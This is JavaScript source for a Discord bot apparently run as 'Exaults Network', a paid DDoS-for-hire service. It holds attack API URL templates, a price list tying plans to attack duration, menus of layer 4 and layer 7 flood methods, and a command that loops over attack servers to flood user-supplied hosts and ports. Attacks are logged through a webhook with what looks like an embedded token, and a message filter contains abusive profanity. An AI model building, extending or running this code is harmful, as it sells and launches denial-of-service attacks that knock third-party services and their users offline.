...
var SimpleAPI = [
"http://Simple-API/api.php?key=WizzlyV3&host={0}&port={1}&time={2}&method={3}",
"http://Simple-API/api.php?key=WizzlyV3&host={0}&port={1}&time={2}&method={3}"
];
var NormalAPI = [
"http://Normal-API/api.php?key=WizzlyV3&host={0}&port={1}&time={2}&method={3}",
"http://Normal-API/api.php?key=WizzlyV3&host={0}&port={1}&time={2}&method={3}",
"http://Normal-API/api.php?key=WizzlyV3&host={0}&port={1}&time={2}&method={3}"
];

var AdvancedAPI = [
"http://Advanced-API/api.php?key=WizzlyV3&host={0}&port={1}&time={2}&method={3}",
"http://Advanced-API/api.php?key=WizzlyV3&host={0}&port={1}&time={2}&method={3}",
"http://Advanced-API/api.php?key=WizzlyV3&host={0}&port={1}&time={2}&method={3}"
];

var ExaultsAPI = [
"https://www.yahoo.com/api?key=KEYYYYYY&host={0}&port={1}&time={2}&method={3}",
"https://www.yahoo.com/api?key=KEYYYYYY&host={0}&port={1}&time={2}&method={3}",
"https://www.yahoo.com/api?key=KEYYYYYY&host={0}&port={1}&time={2}&method={3}"
];

var servidorADM = [
"http://MachineDDoS-host/api.php?key=ExaultsV3&host={0}&port={1}&time={2}&method={3}",
"http://MachineDDoS-host/api.php?key=ExaultsV3&host={0}&port={1}&time={2}&method={3}"
];

var TEMPLATE = ["http://hostmaquina/api.php?key=ProibidoComunista&host={0}&port={1}&time={2}&method={3}"]
...
var soma4 = ExaultsAPI.length
var soma5 = soma1 + soma2 + soma3 + soma4

const thumbnails = [
"https://cdn.discordapp.com/attachments/959126367813894194/1017145909261389834/0ba1bd4156cf914e1b9e7b815b20f7f8.jpg",
"https://cdn.discordapp.com/attachments/959126367813894194/1017145909261389834/0ba1bd4156cf914e1b9e7b815b20f7f8.jpg",
"https://cdn.discordapp.com/attachments/959126367813894194/1017145909261389834/0ba1bd4156cf914e1b9e7b815b20f7f8.jpg",
]
//
setTitle("[" + soma4 +"] Exaults-Network V4 │ Coded by: " + Autor);
bot.on("ready", () => {
    ...
    console.log("#   # #       #   # # # #   # #     #  #  ")
    console.log("#   # #####   #    ###   ###  #     #   # ")
    console.log("NO KOMEM")
    console.log()

bot.user.setPresence({
    game: {
        name: `Dev: Wizzly / xhelp`,
        type: "PLAYING",
        url: "https://twitch.tv/wizzkintil"
      }
    }
  );
});
...
const command = args.shift().toLowerCase();
  ...
  if(msg.content.includes('https://discord.gg')) {
    ...
    message.delete(1);
    msg.channel.sendMessage("JANGAN SHARELINK TOLOL ANAK MEMEK HARAM GUA BANTAI JUGA LU")
    return;
  }
...
if (command === 'help') {
  ...
  console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Command: ` + green + `.help ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)

  const response = new Discord.RichEmbed()
    .setColor("#8b1e9b")
    .setAuthor(`Welcome to the new version of ExaultsNetwork.`,"","https://discord.gg/Dn3duEKUXd")
    .setTitle("🤖 - ExaultsNetwork - Help Menu - 🤖")
    .setDescription("Commands ExaultsNetwork")
...
if (command === 'buy') {
  ...
  console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `xbuy ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)
  const privbuyembed = new Discord.RichEmbed()
    .setImage("https://cdn.discordapp.com/attachments/959126367813894194/1017145909261389834/0ba1bd4156cf914e1b9e7b815b20f7f8.jpg")
    .setColor('#ff0000')
    .setTitle('🤖 - Exaults Network - Buy Menu - 🤖')
    .setThumbnail('https://cdn.discordapp.com/attachments/959126367813894194/1017145909261389834/0ba1bd4156cf914e1b9e7b815b20f7f8.jpg')
    .setDescription("**__Read First__**\n\nRegardless of the plan you acquire, remember that there are other people to send out attacks. It does not overload servers by sending multhostle attacks at the same time or flooding the same host. ", true)
    .addField("```PLAN```", "```diff\n-Simples\n-Normal\n-Advanced\n-Angel\n-Exaults```", true)
    .addField("```SPECIFICATION```", "```yaml\n120 Sec\n300 Sec\n600 Sec\n1200 Sec\n3600 Sec\n```", true)
    .addField("```PRICE```", "```http\n25.00$\n50,00$\n75,00$\n100,00$\n150,00$\n```", true)
    .addField("```METHODS```", "**__PAYPAL__ Only!**")
...
console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `xmethods ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)

const methodsem = new Discord.RichEmbed()
  .setColor("#ff0000")
  .setTitle("🤖 - Exaults Network - Methods DDoS - 🤖")
  ...
  .addField("**Layer 4 TCP**", "```http\nTELNET\nTCP_VOX\nTCP_XMAS```", true)        
  .setTimestamp()
  .setFooter("ExaultsNetwork - V3.", "https://cdn.discordapp.com/attachments/959126367813894194/1017145909261389834/0ba1bd4156cf914e1b9e7b815b20f7f8.jpg");
...
console.log(reset + "[" + l4cyan + moment.tz("America/Sao_Paulo").format('HH:mm A') + reset + "] " + reset + `[` + emoji + `]` + reset + ` Comando: ` + green + `xmethods-l7 ` + reset + `Autor: ` + green + `${msg.author.username}` + reset)
...
console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[DB]` + reset + ` ${msg.author.username} ` + l7yellow + `->` +  lightred + ` Config` + reset + ` Status: ` + red + `Preenchimento` + reset)
const incorrectUser = new Discord.RichEmbed()
      .setColor("BLACK")
      .setTitle("You entered the data incorrectly")
      .setDescription("```ini\nxgive [user] [time] [concurrents] [days] [api/servers]```")
...
const metodoembed = new Discord.RichEmbed()
  .setColor("#ff0000")
  .setTitle("Database Editor -> Exaults@V3")
...
if (command === 'botinfo') {
  ...
  const response = new Discord.RichEmbed()
    ...
    .setTitle("*** ExaultsV3 Botnet Stats ***")
    .setColor("RED")
    .setThumbnail(msg.author.displayAvatarURL)
...
if (args < 1) {
  const response = new Discord.RichEmbed()
    ...
    .setTimestamp()
    .setFooter(`${msg.author.username} - ExaultsV6 Botnet.`, `${msg.author.displayAvatarURL}`);
...
const { data } = await axios.get(`http://free.hostwhois.io/json/${args[0]}`),
//
   response = new Discord.RichEmbed()
    .setColor("#249c2b")
    .setTitle("🤖 - ExaultsNetwork - host Lookup Tool - 🤖")
    ...
    .addBlankField(true)
    .setTimestamp()
    .setFooter("GEO-host LookUP Tool", "https://cdn.discordapp.com/attachments/668654887650983936/668678545131831306/1024px-Circle-icons-tools.png");
...
let serverusers;
  if (users[msg.author.id].servers.includes("Simple")) {
    ...
    network = "Advanced";
    plano = "Advanced" 
  } else if (users[msg.author.id].servers.includes("Exaults")) {
    server = ExaultsAPI;
    size = ExaultsAPI.length;
    network = "Exaults";
    plano = "Exaults"
  } else {
    server = "No Plan"
...
if(config.blacklist.hosts.includes(args[0])){
  console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `BlackList ` + reset + `host: ` + green + args[0] + reset + ` Network: ` + purple + `PAID`)
    ...
    for (var i = 0; i < config.methods.layer4.length; i++) {
        wizzlykambek = wizzlykambek + config.methods.layer7[i] + " " + config.methods.layer4[i];
    }
    if (!wizzlykambek.includes(args[3].toUpperCase())) {
      ...
      const metodoembed = new Discord.RichEmbed()
        ...
        .setThumbnail(`${msg.author.displayAvatarURL}`)
        .addField("**__Error__**", "The method you requested was not found in the ExaultsNetwork database, use: `.methods` to check the available methods.", true)
        .addField("**__host__**", "**" + args[0] + "**", true)
        .setTimestamp()
        .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
      return msg.channel.send(metodoembed);
    ...
    for (var i = 0; i < server.length; i++) {
        axios.get(format(server[i], target, port, time, method.toUpperCase())).catch(error => {
            ...
            const embed1 = new Discord.RichEmbed()
              .setColor("#ff0000")
              .setTitle(":exclamation: ERROR LOG :exclamation:")
              ...
              .setTimestamp()
              .setFooter("Server Down - Exaults Network");
...
// IMPORTANT: THIS DATA (in up line) DONT WORK IN WEBSITES!!!!!
    ...
    const embed2 = new Discord.RichEmbed()
      .setAuthor(`A new attack was sent..`,"https://cdn.discordapp.com/attachments/959126367813894194/1017145909261389834/0ba1bd4156cf914e1b9e7b815b20f7f8.jpg")
      .setTitle("```[!] Exaults-Network - Attack [!]```")
      .setColor("#8b1e9b")
      .setThumbnail("https://cdn.discordapp.com/attachments/959126367813894194/1017145909261389834/0ba1bd4156cf914e1b9e7b815b20f7f8.jpg")
      .addField("**__host Attack__**", "```css\n" + target + "```", true)
      .addField("**__Port host__**", "```yaml\n" + port + "```", true)
      .addField("**__Time Attack__**", "```glsl\n" + time + " " + sec + "```", true)
      .addField("**__Method__**", "```yaml\n" + method.toUpperCase() + "```", true)
      .addField("**__Servers__**", "```http\n" + size + "```", true)
      .addField("**__Plan__**", "```\n" + users[msg.author.id].servers + "```", true)
      .addField("**__Network__**", "```http\n" + network + "```", true)
      .addField("**__Response__**", "```glsl\n" + (timeout[Math.floor(Math.random() * timeout.length)]) + " ms```", true)
      .addField("**__Moment__**", "```glsl\n" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "```", true)
      //.addField("**[10] __ISP__**", "```http\n" + data.isp + "```")
      .setTimestamp()
      .setFooter(`${msg.author.tag}, sent a new attack.`, `${msg.author.displayAvatarURL}`);
      //.setImage("https://media.ghosthy.com/media/l4KhQo2MESJkc6QbS/ghosthy.gif")
//
      /*const canal = bot.channels.get(config.channels.logs);
      canal.send(embed2);*/
//
      const webhookClient = new Discord.WebhookClient('1018077939801280534', 'GmK5X9WakwSPGaVNnf0E1DgNsgaEJwyyuWrpxhM1m7Pwb27sweJtG4C0AXS-02zhKR0v');
webhookClient.send('ATTACKS LOGS', {
  embeds: [embed2],
});
//
      let reply = await msg.reply('Attack Succeed, Please check the channel for information<#1017150981835870259>.')
      reply.react('✅')
//
